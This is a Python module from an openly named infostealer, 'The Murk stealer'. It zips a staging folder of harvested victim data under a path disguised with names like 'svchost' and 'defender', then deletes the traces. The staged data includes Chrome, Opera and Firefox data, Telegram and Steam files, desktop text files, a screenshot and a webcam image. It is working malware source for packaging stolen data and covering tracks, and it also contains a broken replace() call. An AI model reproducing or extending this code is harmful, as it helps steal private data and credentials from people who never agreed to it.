#-----------------------------------------------------------------------------#
#████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗#
#╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝#
#░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░#
#░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░#
#░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗#
#░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝#
#                        by: Nick_Vinesmoke                                   #
#                 https://github.com/Nick-Vinesmoke                           #
#         https://github.com/Nick-Vinesmoke/The-Murk-stealer                  #
#-----------------------------------------------------------------------------#
import shutil
import os

def makemeZip():
	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		user = 'The murk'
	shutil.make_archive(fr'windows__cache__\svchost\defender\daksldjlas\dsadsad\sd\dsa\ds\ds\ds\as\dsa\das\ds\sad\das\das\das\dsa\dsa\dsa\das\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\{user}-results', 'zip', 'C:\\windll')
	shutil.rmtree(r'C:\windll\Chrome', ignore_errors=True)
	shutil.rmtree(r'C:\windll\Opera', ignore_errors=True)
	shutil.rmtree(r'C:\windll\Firefox', ignore_errors=True)
	shutil.rmtree(r'C:\windll\SystemInformation', ignore_errors=True)
	shutil.rmtree(r'C:\windll\Telegram', ignore_errors=True)
	shutil.rmtree(r'C:\windll\Steam', ignore_errors=True)
	shutil.rmtree(r'C:\windll\TxtFilesFromDesktop', ignore_errors=True)
	shutil.rmtree(r'C:\windll', ignore_errors=True)
	try:
		os.remove(r'C:\windll\sreenshot.jpg')
		os.remove(r'C:\windll\webcam.png')
	except:
		pass